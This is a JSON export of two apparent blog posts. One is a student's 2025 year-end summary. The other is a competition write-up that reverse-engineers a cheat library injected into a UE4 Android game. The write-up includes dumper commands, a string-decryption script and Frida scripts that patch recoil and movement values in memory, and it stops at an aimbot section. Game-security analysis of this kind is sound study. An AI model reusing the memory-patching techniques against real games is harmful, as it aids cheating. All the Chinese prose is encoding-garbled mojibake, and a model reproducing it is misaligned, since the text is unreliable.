[{"content":"å‰è¨€ æˆä¸ºå®‰å“äººçš„ä¸€å¹´, ä»Šå¹´ç®—æ˜¯æˆ‘äººç”Ÿä¸­æ¯”è¾ƒé‡è¦çš„ä¸€å¹´äº†, å¯¹è‡ªå·±æœªæ¥è¦èµ°çš„é“è·¯ç®—æ˜¯æ¸…æ™°äº†ä¸€äº›, ä¸è¿‡è¿˜æ˜¯åœ¨è¿·èŒ«ä¸­æ…¢æ…¢çš„æ‘¸ç´¢, ä¹‹å‰ä¹Ÿæ²¡å†™è¿‡å¹´ç»ˆæ€»ç»“, è¯´èµ·æ¥å¯¹ä»¥å‰çš„è®°å¿†ä¹Ÿæœ‰äº›æ¨¡ç³Šäº†, ç”Ÿæ´»è¿˜æ˜¯è¦å¤šè®°å½•ä¸€äº›ã€‚\nä¸€æœˆ å¹³å¹³æ·¡æ·¡çš„ä¸€æœˆ, æ˜¯åŠ å…¥ADä¹‹åçš„æ¢ç´¢, æ­äº†è¿™æ ·ä¸€ä¸ªç®€å•çš„blog, ç”¨æ¥è®°å½•ä¸€ä¸‹è‡ªå·±å­¦ä¹ çš„è¿‡ç¨‹, ç°åœ¨å›å¤´æ¥çœ‹å·²ç»å¥½ä¹…æ²¡æ›´æ–°äº†å“ˆå“ˆå“ˆ, æœ‰å…¶ä»–çš„äº‹è¦å¿™, æ‰€ä»¥å†™blogçš„æ—¶é—´è‡ªç„¶åœ°è¢«ç æ‰äº†(å…¶å®æ˜¯æ‡’)ã€‚åŒæ—¶ä¹Ÿåœ¨åˆæ­¥æ¢ç´¢Androidå®‰å…¨å’Œæ¸¸æˆå®‰å…¨è¿™ä¸ªä¸¤ä¸ªé¢†åŸŸçš„çŸ¥è¯†\næ˜¥èŠ‚æ€ä¹ˆèƒ½æ²¡æœ‰çƒŸèŠ±å‘¢\näºŒæœˆ äºŒæœˆä¾æ—§æ²‰æ·€, å€¼å¾—ä¸€æçš„æ˜¯æ‰“äº†VNCTFå¹¶ä¸”æ˜¯Reæ–¹å‘çš„ç¬¬å››å, å¹¶ä¸”åŠ å…¥äº†VNè¿™ä¸ªè”é˜Ÿ, è”é˜Ÿçš„æ¯ä¸ªå¸ˆå‚…äººéƒ½å¾ˆå¥½, å¤§å®¶ä¸€èµ·è®¨è®º, ä¸€èµ·æ‰“æ¯”èµ›, æ°›å›´è¶…æ£’ğŸ‘ã€‚ ç„¶åå°±æ˜¯ç»§ç»­å­¦Androidäº†, ç°åœ¨æƒ³èµ·æ¥å½“æ—¶å•ƒollvmçš„æ—¶å€™æ˜¯çœŸçš„ç—›è‹¦(èƒ½ä¸èƒ½åˆ«è®©å‚»å­å¹²è¿™ä¸ª), å°½ç®¡å·²ç»åˆ°å¤„æ‰¾èµ„æ–™çœ‹äº†ä¹Ÿè¿˜æ˜¯çœ‹å¾—åŠæ‡‚ä¸æ‡‚çš„æ„Ÿè§‰, ä¸è¿‡ç°åœ¨å€’æ˜¯å¥½ä¸€äº›äº†, æ··æ·†å¯¹æŠ—è¿™äº›å€’æ˜¯ä¹Ÿèƒ½å¤„ç†ä¸€ç‚¹è€Œä¸è‡³äºå®Œå…¨æ²¡åŠæ³•, ä»¥åä¹Ÿè¿˜éœ€è¦ä¸æ–­çš„å­¦ä¹ è¿™ä¸€å—çš„çŸ¥è¯†qaq\né™„ä¸€å¼ VNçš„å¥–å“:)\nä¸‰æœˆ ä¸‰æœˆè›®æœ‰æ„æ€, ä¸­æ—¬å»é•¿æ²™æ‰“äº†ccssscçš„åŠå†³èµ›, ä¹Ÿæ˜¯ç¾ç¾åœ°è¢«é˜Ÿå‹å¸¦é£è¿›å†³èµ›äº†, æƒ³èµ·é«˜è€ƒåçš„æš‘å‡ä¹Ÿå»äº†ä¸€æ¬¡é•¿æ²™, è¿™æ¬¡å†å»çš„æ—¶å€™åˆå–åˆ°äº†å¿ƒå¿ƒå¿µå¿µçš„èŒ¶é¢œæ‚¦è‰², ä¸è¿‡æƒ³å–·ä¸€ä¸‹æ¯”èµ›åœºåœ°æœ‰ç‚¹æŠ½è±¡äº†\u0026hellip;\né™¤äº†ccssscä¹‹å¤–è¿˜æœ‰txçš„æ¸¸æˆå®‰å…¨ç«èµ›çš„åˆèµ›, å½“æ—¶ä¸ºè¿™ä¸ªæ¯”èµ›ä¹ŸèŠ±äº†ä¸å°‘æ—¶é—´å‡†å¤‡, å½“æ—¶å…¶å®æ²¡è§‰å¾—èƒ½è¿›å†³èµ›(æ‰“çš„æœ‰ç‚¹å°çƒ‚, èœå°±å¤šç»ƒ), æ„å¤–çš„æ˜¯ç«Ÿç„¶çœŸçš„è¿›äº†å†³èµ›, ä¹Ÿå¾ˆæ„Ÿè°¢fallw1ndå­¦é•¿çš„æŒ‡å¯¼, å¯¹æˆ‘çš„å­¦ä¹ çœŸçš„ç»™äºˆäº†å¾ˆå¤šå¾ˆå¤šçš„å¸®åŠ©, ä¹Ÿæ˜¯æˆ‘æœ€å°Šé‡çš„å¸ˆå…„!winç¥!\nå›¾ç‰‡å¤ªå¤šæ”¾ä¸€å¼ æ„æ€ä¸€ä¸‹å§å“ˆå“ˆ\nå››æœˆ å››æœˆä»½å”¯ä¸€é‡è¦çš„å°±æ˜¯æ¸¸æˆå®‰å…¨çš„å†³èµ›äº†, ä¸å‡ºæ„å¤–, å†³èµ›è¿˜æ˜¯æ²¡æ‰“è¿‡, ä¹Ÿæ„è¯†åˆ°äº†è‡ªå·±è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦å­¦ä¹ , æ‰“è¿™ä¸ªæ¯”èµ›ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡é€šå®µ, æ•´æ•´ä¸¤å¤©æ²¡æœ‰ç¡è§‰qaq, åœ¨å·¥ä½æˆ˜æ–—åˆ°æœ€åä¸€åˆ», ä¸è¿‡è¿™æ„Ÿè§‰ä¹ŸæŒºçˆ½çš„, æ™šä¸Šå·¥ä½å¾ˆå®‰é™, è‡ªå·±ååœ¨å·¥ä½ä¸€ç‚¹ç‚¹æŸ¥èµ„æ–™å’Œåˆ†ææ¸¸æˆ, ä¹Ÿç®—æ˜¯ä¸€ä¸ªçè´µçš„ç»å†ã€‚\næ¯”èµ›ä¹‹åä¹Ÿè¿˜æ˜¯åœ¨ç»§ç»­å­¦ä¹ , ä¹Ÿæ˜¯åœ¨è¿™ä¸ªæ—¶å€™å¼€å§‹å­¦äº†ä¸€äº›Androidå†…æ ¸çš„çŸ¥è¯†, å†…æ ¸æ¨¡å—çš„ç¼–å†™ç­‰è¿˜æœ‰å…¶ä»–çš„rootæ¡†æ¶å’Œæ¨¡å—è¿™äº›ã€‚\näº”æœˆ äº”æœˆä¹Ÿæ˜¯æ…¢æ…¢å¿™èµ·æ¥äº†, ä¸€ä¸ªæ˜¯å­¦ä¸šä¸Šæœ‰å¤§å¤§å°å°çš„å®éªŒè¦åš, è€Œä¸”è¿˜æ˜¯è®¡ç»„è®¡ç½‘os, å¦å¤–å°±æ˜¯ä¹‹å‰çš„ccssscçš„å†³èµ›äº†, åˆä¸€æ¬¡æ¥åˆ°äº†é•¿æ²™, æœ€åä¹Ÿæ˜¯è£è·ä¼˜èƒœå¥–ã€‚\né™¤æ­¤ä¹‹å¤–è¿˜å»å‚åŠ äº†ä¸€ä¸‹æ¸¸æˆå®‰å…¨è¡Œä¸šå³°ä¼š, ç®—æ˜¯æ‹“å±•ä¸€ä¸‹è‡ªå·±çš„è§†é‡, çœ‹çœ‹æ¸¸æˆå®‰å…¨è¡Œä¸šå¯¹æŠ—å‘å±•åˆ°äº†ä»€ä¹ˆç¨‹åº¦, ä¹Ÿå’Œå‡ ä¸ªå‚åŠ äº†å†³èµ›çš„å¸ˆå‚…é¢åŸºäº†ä¸€ä¸‹, akèŒ¶æ­‡è¿™ä¸€å—\næœ€åå°±æ˜¯å·¥ä½œå®¤äººç¾å¿ƒå–„çš„å­¦å§æ¨äº†ä¸€ä¸ªxhsçš„å®ä¹ ç»™æˆ‘ä»¬, è¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å†™ç®€å†å’Œé¢è¯•, å¯ä»¥è¯´å­¦åˆ°äº†ä¸å°‘çš„ä¸œè¥¿, ä¸€é¢å¾ˆç´§å¼ è€Œä¸”é—®äº†å¤§æ¦‚åŠå°æ—¶, å¾ˆæ„Ÿè°¢å­¦é•¿å­¦å§ä»¬ç»™çš„ä¸€äº›é¢ç», æœ€åä¹Ÿæ˜¯é¡ºåˆ©çš„é€šè¿‡äº†ä¸€é¢è¿›åˆ°äºŒé¢ã€‚\nå…­æœˆ å…­æœˆå·²ç»æ˜¯è€ƒè¯•æœˆäº†, åŸºæœ¬éƒ½åœ¨å¿™è€ƒè¯•çš„äº‹, xhsçš„äºŒé¢ç»“æŸä¹‹åä¸€ç›´æ²¡æ¶ˆæ¯, å…¶å®æ„Ÿè§‰è‡ªå·±é¢çš„è¿˜ç®—ä¸é”™(? ç›´åˆ°6.15éƒ½æ²¡æ¶ˆæ¯, å„ç§‘çš„è€ƒè¯•ä¹Ÿé™†é™†ç»­ç»­å¿«è€ƒå®Œäº†, ç„¶åå°±æ”¶åˆ°HRçš„ç”µè¯å•†é‡å…¥èŒæ—¶é—´, è¯´å®è¯è¿˜æ˜¯æŒºæƒŠè®¶çš„, ä¸€ç›´ä»¥ä¸ºå·²ç»å¯„äº†, å·²ç»åšå¥½æš‘å‡æ²‰æ·€çš„è®¡åˆ’äº†ã€‚æœ€åæ‹¿åˆ°offerå»å®ä¹ äº†ã€‚\nä¸ƒæœˆ-ä¹æœˆ è¿™ä¸‰ä¸ªæœˆè‡ªç„¶æ˜¯ç—›è‹¦çš„å®ä¹ é˜¶æ®µ, ä¸€æ–¹é¢æ˜¯å¯¹è‡ªå·±èƒ½åŠ›ä¸è¶³çš„ç„¦è™‘, å¦ä¸€æ–¹é¢æ˜¯å¯¹æœªæ¥å»å‘çš„è¿·èŒ«, å¥½åœ¨mtä»¥åŠåŒäº‹äººéƒ½å¾ˆå¥½, xhsçš„å¾…é‡ä¹Ÿå¾ˆä¸é”™, æ¯å¤©éƒ½ä¼šå»æ‹¿ç‚¹é›¶é£Ÿé¥®æ–™ä»€ä¹ˆçš„åƒ, å®ä¹ é˜¶æ®µä¹Ÿå­¦åˆ°äº†å¾ˆå¤šæ–°çš„çŸ¥è¯†, è®¾å¤‡æŒ‡çº¹ã€é£æ§ã€åçˆ¬ã€è‡ªåŠ¨åŒ–ç­‰éƒ½æœ‰äº›è®¸æ¥è§¦, è™½ç„¶ç›¸å¯¹æ¥è®²æ²¡æœ‰å¾ˆæ·±å…¥, ä½†æ˜¯ä¹Ÿè®©æˆ‘å¯¹è¿™ä¸ªè¡Œä¸šçš„æŠ€æœ¯æ ˆæ›´æ¸…æ™°äº†ä¸€äº›ã€‚å½“ç„¶ä¹Ÿä¼´éšç€ä¸å°‘çš„ç„¦è™‘, å¤§éƒ¨åˆ†æ¥è‡ªäºèƒ½åŠ›è¿˜æ˜¯ä¸å¤Ÿå¼ºã€‚å™¢è¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡ç‹¬å±…, è‡ªå·±ç§Ÿæˆ¿å­, ä¸€ä¸ªäººç”Ÿæ´», ä¹Ÿæ˜¯ä¸€ç§æ–°çš„ä½“éªŒ, å”¯ä¸€çš„é—æ†¾æ˜¯æ²¡æ€ä¹ˆå¥½å¥½åœ°æ¬£èµä¸€ä¸‹æ­å·è¿™ä¸ªåŸå¸‚, åªåœ¨ç¦»å¼€ä¹‹å‰è‰è‰åœ°citywalkäº†ä¸€ä¸‹ã€‚\nåæœˆ åæœˆå›åˆ°äº†å­¦æ ¡, å­¦ä¹ çš„è„šæ­¥ä¹Ÿæ²¡æœ‰åœä¸‹æ¥, ç»§ç»­å­¦ä¹ Androidçš„çŸ¥è¯†, ç„¶åå°±æ˜¯å‚åŠ äº†ç¾ŠåŸæ¯, çº¿ä¸Šèµ›çš„æ—¶å€™ä¹Ÿæ˜¯æŠŠReåšçš„å·®ä¸å¤š, çº¿ä¸‹èµ›æ‰“æ¸—é€æˆ‘åŸºæœ¬å°±æ²¡ä»€ä¹ˆå‘åŠ›çš„åœ°æ–¹äº†, åªèƒ½é»˜é»˜åœ°çœ‹ç€é˜Ÿå‹å‘åŠ›, ä¸è¿‡ç«Ÿç„¶èµ°è¿ç»™æˆ‘æ‹¿äº†ä¸ªä¸€è¡€ä¹Ÿæ˜¯æŒºæ„å¤–çš„, æœ€åä¹Ÿæ˜¯æ‹¿äº†ä¸ªç¬¬å…­, ä¸‰ç­‰å¥–, æ„Ÿè°¢é˜Ÿå‹å¸¦é£@GamerNoTitle,@Rusty, @Ron\nåä¸€æœˆ åä¸€æœˆåœ¨å¿™å·¥ä½œå®¤çš„æ–°ç”Ÿèµ›, ä¸è¿‡æˆ‘æ²¡å‡ºä»€ä¹ˆåŠ›qaqï¼Œè¦å¿™ä¸€äº›æ”»é˜²çš„ä»»åŠ¡è¿˜æœ‰å‡ºé¢˜, çœ‹åˆ°æœ‰äººèƒ½åšå‡ºæˆ‘å‡ºçš„é¢˜ä¹Ÿæ˜¯æŒºæœ‰æˆå°±æ„Ÿçš„, å¸Œæœ›ä»¥åèƒ½æ›´æœ‰åˆ›æ„ä¸€äº›è€Œä¸æ˜¯å‡ºä¸€äº›çº¯çŸ¥è¯†ç‚¹çš„é¢˜ç›®, ä¹Ÿè®¤è¯†äº†ä¸€äº›å¾ˆå‰å®³çš„å¤§ä¸€å¤§äºŒçš„å°ç™»\næ²¡ä»€ä¹ˆæœ‰æ„æ€çš„å›¾ç‰‡, æ¥å¼ é£æ™¯ç…§å§\nåäºŒæœˆ ä¸€å¹´çš„æœ€åä¸€ä¸ªæœˆ, è¿™ä¸ªæœˆä¹Ÿæ˜¯å¹³å¹³æ·¡æ·¡, è¿˜æ˜¯åœ¨å­¦ä¹ Androidçš„çŸ¥è¯†, ä»¥åŠè¢«ä¸€äº›å¤§å¤§å°å°çš„è€ƒè¯•çƒ¦æ‰°ç€, by the way, æ„Ÿè§‰è‡ªå·±ç¡è§‰çš„æ—¶é—´è¶Šæ¥è¶Šæ™šäº†, æœ‰æ—¶å€™ä¸åˆ°å‡Œæ™¨ä¸¤ç‚¹éƒ½ç¡ä¸ç€è§‰, æ€»æ„Ÿè§‰è‡ªå·±è¯¥åšç‚¹ä»€ä¹ˆqaq\né‚£å°±æ™’ä¸€ä¸‹æ–°é”®ç›˜8\næ–°çš„ä¸€å¹´çš„æ†§æ†¬ å¸Œæœ›èƒ½ç»§ç»­ä¿æŒå¯¹Androidå®‰å…¨çš„çƒ­çˆ± ç”Ÿæ´»èƒ½å¤Ÿè§„å¾‹ä¸€äº›, ä¸è¦ç†¬å¤œ, å¤šé”»ç‚¼ è¿›å¤§å‚! ","date":"2025-12-31T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202601010026265.jpg","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","title":"2025å¹´ç»ˆæ€»ç»“"},{"content":"é™„ä»¶è¯´æ˜ æ–‡ä»¶åç§° åŠŸèƒ½ decode.py å¤„ç†å­—ç¬¦ä¸²è§£å¯† hack.js å®ç°ä¿®å¤åŠŸèƒ½çš„Fridaè„šæœ¬ SDK.txt Dumpå¾—åˆ°çš„æ¸¸æˆSDK Actor.txt Dumpå¾—åˆ°çš„Actorlist hack.jsçš„ç”¨æ³•ä¸ºï¼šç»ˆç«¯è¾“å…¥\n1 frida -U -f com.ACE2025.Game -l hack.js ç­‰å¾…æ¸¸æˆå¯åŠ¨ä¹‹åç»§ç»­åœ¨ç»ˆç«¯è¾“å…¥: my_hack()è°ƒç”¨my_hackå‡½æ•°\nè·å–UE4ä¸‰ä»¶å¥— ç”¨frida-ue4dumperå¾—åˆ°base: 0x764bd2f000, GUObjectArray: undefined, GName: 0x7656b1f7c0 å¾—åˆ°GNameåç§»ï¼š0xADF07C0 GWorld: 0xAFAC398 (é€šè¿‡å­—ç¬¦ä¸²SeamlessTravel FlushLevelStreamingå®šä½) GUObject: 0xAE34A98 (é€šè¿‡å­—ç¬¦ä¸²Max UObject count is invalid. It must be a number that is greater than 0.å®šä½)\ndumpSDK\n1 ./ue4dumper64 --package com.ACE2025.Game --ptrdec --sdku --gname 0xADF07C0 --guobj 0xAE34A98 --output /data/local/tmp --newue+ dumpActors\n1 ./ue4dumper64 -- package com.ACE2025.Game --ptrdec --actors --gname 0xADF07C0 --gworld 0xAFAC398 --output /data/local/tmp/actors.txt --newue+ dump libUE4.so\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [INFO] RootService: Service connected ========================== Process : com.ACE2025.Game PID: 15801 FILE: libUE4.so Start Address: 764bd2f000 End Address: 7656a3d000 Size Memory: 173MB (181460992) [INFO] Fixing... [INFO] Fixer output : Rebuilding Elf(So) warning load size [185078944] is bigger than so size [181460992], dump maybe incomplete!!! warning DT_HASH not found,try to detect dynsym size... fixed so has write to /sdcard/PADumper/com.ACE2025.Game/764bd2f000-7656a3d000-libUE4_fix.so Rebuilding Complete Output: /sdcard/PADumper/com.ACE2025.Game [INFO] Dump Success ========================== åˆ†æå¤–æŒ‚åŠ è½½é€»è¾‘ ç›´æ¥åˆ æ‰libGame.soå†å¯åŠ¨æ¸¸æˆä¼šcrashï¼ŒæŸ¥çœ‹logå¯ä»¥å®šä½åˆ°libGame.soæ˜¯åœ¨libUE4.soåŠ è½½çš„æ—¶å€™åŠ è½½çš„ï¼Œå¹¶ä¸”å‘ç°libUE4.soçš„ä¾èµ–ä¸­åŒ…å«äº†libGame.soï¼Œå¯ä»¥ç¡®è®¤æ˜¯ELFæ„ŸæŸ“æ³¨å…¥ é€šè¿‡readelfå¯ä»¥çœ‹åˆ°libGame.soæ˜¯libUE4.soçš„ä¾èµ–ï¼Œå…·ä½“çš„å®ç°é€»è¾‘åº”è¯¥æ˜¯é€šè¿‡ä¿®æ”¹DT_NEEDEDæ ‡ç­¾æ¥åŠ è½½è¿™ä¸ªso.\næ£€æŸ¥PHTæ•°ç»„ä¸­p_tagä¸ºPT_DYNAMICçš„å…ƒç´ ï¼Œå¹¶æ‰¾åˆ°å…¶ä¸­d_tagä¸ºDT_STRTABçš„å…ƒç´ ï¼Œå…¶å€¼å°±æ˜¯å­—ç¬¦ä¸²è¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»ï¼Œd_tagä¸ºDT_STRSZçš„å…ƒç´ çš„å€¼æ˜¯å­—ç¬¦ä¸²è¡¨çš„é•¿åº¦ï¼Œå°†ä¸¤è€…ç›¸åŠ å³ä¸ºå­—ç¬¦ä¸²è¡¨æœ«å°¾çš„åœ°å€ï¼Œå‘ç°å­—ç¬¦ä¸²è¡¨ä¸­æœ‰libGame.soï¼Œå¹¶ä¸”DT_NEEDEDæ¡ç›®ä¸­åŒ…å«äº†libGame.soï¼Œå½“linkeråŠ è½½libUE4.soæ—¶ï¼Œä¼šè§£ælibUE4.soçš„dynamicæ®µï¼Œå¹¶éå†DT_NEEDEDæ¡ç›®ï¼Œç”Ÿæˆæ–°çš„Â LoadTaskï¼Œé€’å½’åŠ è½½æ‰€æœ‰ä¾èµ–åº“\nå¤–æŒ‚é€»è¾‘å®ç° libGame.soçš„å‡½æ•°éƒ½è¢«CFFæ··æ·†è¿‡äº†ï¼Œç”¨D810æ’ä»¶å¯ä»¥æœ‰æ¯”è¾ƒä¸é”™çš„å»æ··æ·†æ•ˆæœï¼Œèµ·ç ç®—æ˜¯èƒ½çœ‹äº† libGame.soçš„init_arrayæ®µä¸­ä¼šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œè¿½è¸ªè¿™ä¸ªå‡½æ•°çš„è°ƒç”¨é“¾å¯ä»¥å‘ç°sub_27F0ä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°å°±æ˜¯å¤–æŒ‚é€»è¾‘çš„å®ç°äº† å­—ç¬¦ä¸²è§£å¯† 0x1B9Cå‡½æ•°æ˜¯ä¸»è¦æ‰§è¡Œå¤–æŒ‚é€»è¾‘çš„å‡½æ•°\nåœ¨libGame.soé‡Œé¢è¿˜æœ‰å‡ ä¸ªå­—ç¬¦ä¸²è§£å¯†å‡½æ•°ï¼Œç”±äºæ•°é‡ä¸æ˜¯å¾ˆå¤šæ‰€ä»¥æˆ‘å¹¶æ²¡æœ‰å†™ä¸€ä¸ªä¸€æ¬¡æ€§è§£å¯†æ‰€æœ‰å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œå¦‚æœéœ€è¦è§£å¯†å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡ç‰¹å¾åŒ¹é…çš„æ€è·¯æ¥è§£å†³ï¼Œå­—ç¬¦ä¸²è§£å¯†å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å­˜æ”¾è§£å¯†åçš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯†æ–‡ï¼Œè¿™ç§å­—ç¬¦ä¸²è§£å¯†å‡½æ•°çš„ç‰¹å¾å°±æ˜¯å‰nä¸ªå­—èŠ‚åšå¯†é’¥ï¼Œåé¢çš„åˆ™æ˜¯å¯†æ–‡ï¼Œå­—ç¬¦ä¸²çš„é•¿åº¦å°±æ˜¯ifæ¡ä»¶ä¸­çš„å€¼ï¼Œå¦‚æœä½¿ç”¨ç‰¹å¾åŒ¹é…çš„è¯æ€è·¯å°±æ˜¯åŒ¹é…^,%, if == nè¿™æ ·çš„å¼å­æ¥è·å–å­—ç¬¦ä¸²é•¿åº¦å’Œå¯†é’¥é•¿åº¦ï¼Œç„¶åæŸ¥æ‰¾å­—ç¬¦ä¸²å‡½æ•°çš„äº¤å‰å¼•ç”¨ï¼Œæå–å‚æ•°ä¸­çš„åœ°å€ï¼Œå¹¶ç”¨IDAçš„apiè¯»å–æŒ‡å®šåœ°å€çš„æ•°æ®ï¼Œç„¶åå¤ç°è§£å¯†å‡½æ•°è¿›è¡Œæ‰¹é‡è§£å¯†\næˆ‘è¿™é‡Œä¸ºäº†ä¸å¤æ‚åŒ–å°±å†™ä¸€ä¸ªè§£å¯†å‡½æ•°æ¥æ‰‹åŠ¨ä¿®æ”¹é•¿åº¦å’Œæ•°æ®\n1 2 3 4 5 6 7 data = [0xA5, 0x05, 0x5E, 0x29, 0xE2, 0x9A, 0xBB, 0x6E, 0x08, 0x42, 0xC3, 0x55, 0xEC, 0x01, 0x7C, 0xA9, 0x96, 0xD3, 0x59, 0xA8, 0x91, 0xCF, 0x89, 0x11, 0x24, 0xD6, 0xC9, 0x6C, 0x3C, 0x7C, 0xA7, 0xAE, 0x95, 0x1D, 0x67, 0x42] count = 0 for i in range(len(data)): print(chr(data[i + 0x1A] ^ data[i % 0x1A]), end=\u0026#39;\u0026#39;) count += 1 if count == 0x9: break äºæ˜¯å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²ä¿¡æ¯\nåœ°å€ å­—ç¬¦ä¸² 0xB658 libUE4.so 0xB650 - 0xB648 r 0xB634 /proc/%d/maps 0xB620 /proc/self/maps sub_B80(è·å–libUE4åŸºå€) sub_B80å‡½æ•°æ˜¯å¯»æ‰¾libUE4.soçš„åŸºå€ï¼Œå…·ä½“å®ç°æµç¨‹å¦‚ä¸‹:é€šè¿‡fopenå‡½æ•°æ‰“å¼€proc/pid/mapsæ–‡ä»¶æ‰“å¼€ç¨‹åºçš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œé€šè¿‡fgetså‡½æ•°éå†mapsæ–‡ä»¶çš„æ¯ä¸€è¡Œå­—ç¬¦ä¸²ï¼Œé€šè¿‡strstrå‡½æ•°ç­›é€‰åŒ…å«libUE4.soå­—ç¬¦ä¸²çš„è¡Œï¼Œç„¶åé€šè¿‡strtokå‡½æ•°ä»¥å­—ç¬¦-åˆ†å‰²æ–‡æœ¬ï¼Œæå–å­—ç¬¦ä¸²ï¼Œæœ€åä½¿ç”¨strtoulå‡½æ•°è®²å­—ç¬¦ä¸²è½¬æ¢æˆunsigned long intç±»å‹çš„æ•´æ•°ï¼Œé€šè¿‡Fridahookå¯ä»¥å¾ˆå®¹æ˜“åˆ†æå‡ºæ¥è¿™ä¸€å‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function hook_strstr() { const targetModule = \u0026#34;libGame.so\u0026#34;; const strstrPtr = Module.getExportByName(null, \u0026#34;strstr\u0026#34;); Interceptor.attach(strstrPtr, { onEnter: function(args) { const returnAddress = this.returnAddress; const module = Process.findModuleByAddress(returnAddress); if (!module || module.name !== targetModule) return; const mainStr = Memory.readCString(args[0]); const subStr = Memory.readCString(args[1]); console.log(`[${targetModule}] strstr(\u0026#34;${mainStr}\u0026#34;, \u0026#34;${subStr}\u0026#34;)`); } }); } const waitForGameLib = setInterval(() =\u0026gt; { if (Module.findBaseAddress(\u0026#34;libGame.so\u0026#34;)) { clearInterval(waitForGameLib); hook_strstr(); } }, 100); è·å–GWorld å‘ç°è¿™é‡Œå’Œä¹‹å‰æ‰¾åˆ°çš„GWorldåç§»ä¸€è‡´ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œè·å–äº†GWorldçš„åœ°å€\nè·å–PersistentLevel è¿™é‡Œè·å–äº†æŒä¹…å…³å¡çš„æŒ‡é’ˆï¼Œè¿™æ˜¯UWorldç±»ä¸­çš„ä¸€ä¸ªé‡è¦æˆå‘˜ï¼Œå­˜æ”¾äº†Actorsç­‰æ•°æ®ï¼Œæ˜¯éå†ç©å®¶è§’è‰²çš„å…³é”®æˆå‘˜å˜é‡\nè·å–Actorså’ŒActorsçš„æ•°é‡ è¿™é‡Œè·å–äº†Actorçš„æ•°ç»„å’Œé•¿åº¦ï¼Œç”¨äºä¸‹é¢éå†Actorè·å–ç›®æ ‡å¯¹è±¡\néå†Actors æ­¤å¤„éå†Actorå¹¶è·å–æŒ‡å®šå¯¹è±¡ï¼Œè¿™é‡Œçš„0xA63BE28æ˜¯å¯¹è±¡çš„è™šæ ‡æŒ‡é’ˆï¼ŒUE4ä¸­æ¯ä¸ªç±»çš„è™šè¡¨ï¼ˆvtableï¼‰åœ¨libUE4.soä¸­çš„åç§»æ˜¯å›ºå®šçš„ã€‚é€šè¿‡æ¯”å¯¹è™šè¡¨åç§»ï¼Œåˆ¤æ–­å½“å‰ Actor æ˜¯å¦ä¸ºç›®æ ‡å¯¹è±¡\n1 2 3 4 5 6 7 8 9 10 11 12 function my_hack(){ getlibue4(); var actorsAddr = getActorsAddr(); var base = Module.getBaseAddress(\u0026#34;libUE4.so\u0026#34;); for (var key in actorsAddr) { //console.log(\u0026#34;[+] current actor is : \u0026#34;, key); //console.log(\u0026#34;UE4 base = \u0026#34;, base); if (actorsAddr[key].readPointer() - base == 0xA63BE28) { console.log(\u0026#34;[+] Successful Get target Actor : \u0026#34;, key); } } } é€šè¿‡fridaè„šæœ¬å¯ä»¥å‘ç°ç¨‹åºå¯»æ‰¾çš„Actorä¸º: FirstPersonCharacter_C\nä¿®æ”¹ç§»é€Ÿå’ŒåååŠ› è¿™é‡Œå¯ä»¥çœ‹åˆ°å¤–æŒ‚å¯»æ‰¾äº†å‡ ä¸ªå½“å‰å¯¹è±¡çš„åç§»\nå¯ä»¥åœ¨SDKæ‰¾åˆ°è¿™å‡ ä¸ªåç§»å¯¹åº”çš„å˜é‡\nåç§» ç±» å¯¹è±¡ 0x538 MyProjectCharacter.Character.Pawn.Actor.Object RecoilAccumulationRate 0x288 Character.Pawn.Actor.Object CharacterMovementComponent 0x1A0 CharacterMovementComponent.PawnMovementComponent.... MaxAcceleration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function my_hack(){ getlibue4(); var actorsAddr = getActorsAddr(); var base = Module.getBaseAddress(\u0026#34;libUE4.so\u0026#34;); for (var key in actorsAddr) { //console.log(\u0026#34;[+] current actor is : \u0026#34;, key); //console.log(\u0026#34;UE4 base = \u0026#34;, base); if (actorsAddr[key].readPointer() - base == 0xA63BE28) { console.log(\u0026#34;[+] Successful Get target Actor : \u0026#34;, key); var player_addr = actorsAddr[key]; var RecoilAccumulationRate = player_addr.add(0x538); var CharacterMovementComponent = player_addr.add(0x288).readPointer(); var MaxAcceleration = CharacterMovementComponent.add(0x1A0); Memory.writeFloat(MaxAcceleration, 1000); Memory.writeFloat(RecoilAccumulationRate, 5); } } } é€šè¿‡ä¿®æ”¹å¯¹åº”çš„å†…å­˜å€¼å¯ä»¥å‘ç°RecoilAccumulationRateå®é™…ä¸Šæ˜¯è®¡ç®—æªå£æŠ–åŠ¨çš„ç³»æ•°ï¼Œå¤–æŒ‚ä¸­æŠŠæ­¤å¤„ä¿®æ”¹æˆäº†0ï¼Œæ”¹æˆé0çš„å€¼å°±å¯ä»¥å‘ç°å¼€æªä¹‹åæªå£ä¼šä¸Šè°ƒ MaxAcceleration æ˜¯äººç‰©ç§»åŠ¨é€Ÿåº¦çš„å˜é‡ï¼Œç¨‹åºæŠŠè¿™é‡Œçš„å€¼ä¿®æ”¹æˆäº†1000000000ï¼ŒæŠŠå€¼æ”¹æˆ1000åˆ™å¯ä»¥ä½¿äººç‰©æ­£å¸¸è¡Œèµ°\nè‡ªç„ 